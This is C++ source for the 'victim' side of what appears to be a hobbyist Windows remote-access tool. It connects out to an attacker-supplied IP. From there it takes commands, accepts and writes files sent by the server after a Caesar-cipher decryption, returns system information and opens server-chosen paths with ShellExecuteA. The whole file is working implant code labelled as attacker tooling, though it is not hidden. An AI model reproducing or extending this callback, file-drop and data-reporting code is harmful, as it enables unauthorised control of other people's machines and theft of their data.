#include <winsock2.h>
#include <iostream>
#include <ws2tcpip.h>
#include <cstdint>
#include "menu.h"
#include <direct.h>
#include <windows.h> // https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/
#include <sstream>
#include <shellapi.h> // https://learn.microsoft.com/en-us/windows/win32/api/shellapi/
#include "Encryption-Techniques/CaesarCipherShift.h"
#include "System-Info/info.h"

int main(int argc, char* argv[]) {
    if(argc < 2) {
        std::cout << ERROR_PREFIX << " Incorrect usage, please use: \033[32m./victim IP\033[0m" << std::endl;
        return 1;
    }
    sockaddr_in serverAddress;
    WSADATA wsa;
    char buffer[BUFFERSIZE];
    SOCKET sock = INVALID_SOCKET;

    if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { //ver 2.2
        std::cout << ERROR_PREFIX << " WSAStartup failed\n";
        return 1;
    } else {
        std::cout << SUCCESS_PREFIX << " WSAStartup created\n";
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET) {
        std::cout << ERROR_PREFIX << " Socket failed\n";
        WSACleanup();
        return 1;
    } else {
        std::cout << SUCCESS_PREFIX << " Socket created\n";
    }

    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(PORT);
    
    std::string serverip = argv[1];

    if(inet_pton(AF_INET, serverip.c_str(), &serverAddress.sin_addr) <= 0) {
        std::cout << ERROR_PREFIX << " Invalid IP address\n";
        return 1;
    }

    if(connect(sock, (sockaddr*) &serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cout << ERROR_PREFIX << " Connection failed\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    } else {
        std::cout << SUCCESS_PREFIX << " Connection established\n";
    }

    while(true) {
        int type;
        int bytesRec = recv(sock, (char*)&type, sizeof(type), 0);
        if(bytesRec <= 0) {
            std::cout << SERVER_STATUS_CLOSED;
            break;
        }

        if(type == TYPE_TEXT) {
            memset(buffer, 0, BUFFERSIZE);

            bytesRec = recv(sock, buffer, BUFFERSIZE, 0);
            if(bytesRec <= 0) {
                std::cout << SERVER_STATUS_CLOSED;
                break;
            }
            std::string cmd(buffer);
            std::cout << ATTACKER_LABEL << cmd << std::endl;

            std::string clientMessage = std::string(CONSOLE_PREFIX) + " Client received: " + cmd + "\n";
            send(sock, clientMessage.c_str(), clientMessage.size(), 0);
        
        }
        
        if(type == TYPE_FILE) {
            int encryptKey;
            bytesRec = recv(sock, (char*)&encryptKey, sizeof(encryptKey), 0);
            if(bytesRec <= 0) {
                std::cout << ERROR_PREFIX << " Cannot receive encryption key\n";
                continue;
            } else {
                receiverKey(encryptKey);
                std::cout << SUCCESS_PREFIX << " Received encryption key: " << SHIFT << std::endl;
            }

            int64_t fileSize;
            bytesRec = recv(sock, (char*)&fileSize, sizeof(fileSize), 0);
            if(bytesRec < 0 || fileSize < 0) {
                std::cout << ERROR_PREFIX << " Cannot receive file information\n";
                continue;
            }

            int32_t fileNameLeng;
            bytesRec = recv(sock, (char*)&fileNameLeng, sizeof(fileNameLeng), 0);
            if (bytesRec <= 0) {
                std::cout << ERROR_PREFIX << " Cannot receive file name length\n";
                continue;
            }

            char* fileNameBuffer = new char[fileNameLeng + 1];
            bytesRec = recv(sock, fileNameBuffer, fileNameLeng, 0);
            fileNameBuffer[fileNameLeng] = '\0';
            std::string filename(fileNameBuffer);
            delete[] fileNameBuffer;

            char c[BUFFERSIZE];
            _getcwd(c, sizeof(c));
            std::string path = std::string(c) + "\\" + filename;
            std::cout << SUCCESS_PREFIX << " Received file: '" << filename << "'" << std::endl;
            std::cout << PENDING_PREFIX << " Saving file to: " << path << std::endl;

            FILE* fileOutput = fopen(path.c_str(), "wb");
            if(!fileOutput) {
                std::cout << ERROR_PREFIX << " Cannot create file\n";
                continue;
            }
        
            int64_t dataRec = 0;
            while (dataRec < fileSize) {
                int receive = (fileSize - dataRec > BUFFERSIZE) ? BUFFERSIZE : (fileSize - dataRec);
                bytesRec = recv(sock, buffer, receive, 0);
                if (bytesRec <= 0) {
                    break;
                }

                // decrypt
                caesarDecrypt(buffer, bytesRec);

                fwrite(buffer, 1, bytesRec, fileOutput);
                dataRec += bytesRec;
            }
            std::cout << SUCCESS_PREFIX << " Saved file to: " << path << std::endl;

            fclose(fileOutput);
        }

        if (type == TYPE_INFO) {
            std::cout << SUCCESS_PREFIX << " Server requested system information\n";
            std::string sysInfo = getSystemInfo();

            int32_t infoLength = sysInfo.length();
            send(sock, (char*)&infoLength, sizeof(infoLength), 0);
            send(sock, sysInfo.c_str(), infoLength, 0);

            std::cout << SUCCESS_PREFIX << " Sent information to the server\n";
        }

        if(type == TYPE_EXECUTE) {
            int subtype;
            bytesRec = recv(sock, (char*)&subtype, sizeof(subtype), 0);

            switch(subtype) {
                case 1: {
                    int32_t pathLen;
                    bytesRec = recv(sock, (char*)&pathLen, sizeof(pathLen), 0);

                    if(bytesRec > 0 && pathLen > 0 && pathLen < 10000) {
                        char* pathBuf = new char[pathLen + 1];
                        bytesRec = recv(sock, pathBuf, pathLen, 0);

                        if(bytesRec > 0) {
                            pathBuf[pathLen] = '\0';
                            std::string path(pathBuf);
                            delete[] pathBuf;

                            std::cout << PENDING_PREFIX << " Opening: " << path << std::endl;
                            ShellExecuteA(NULL, "explore", path.c_str(), NULL, NULL, SW_SHOWNORMAL);

                            std::string toHostPath = " Successfully opened" + path;

                            int32_t msgLen = toHostPath.length();
                            send(sock, (char*)&msgLen, sizeof(msgLen), 0);
                            send(sock, toHostPath.c_str(), msgLen, 0);
                        }
                    }
                    break;
                }
                
                case 2: {
                    std::cout << CONSOLE_PREFIX << " execute command area\n";
                    break;
                }
            }

        }

        if(type == TYPE_EXIT) {
            std::cout << SERVER_STATUS_CLOSED;
            break;
        }
    }
    closesocket(sock);
    WSACleanup();
    return 0;
}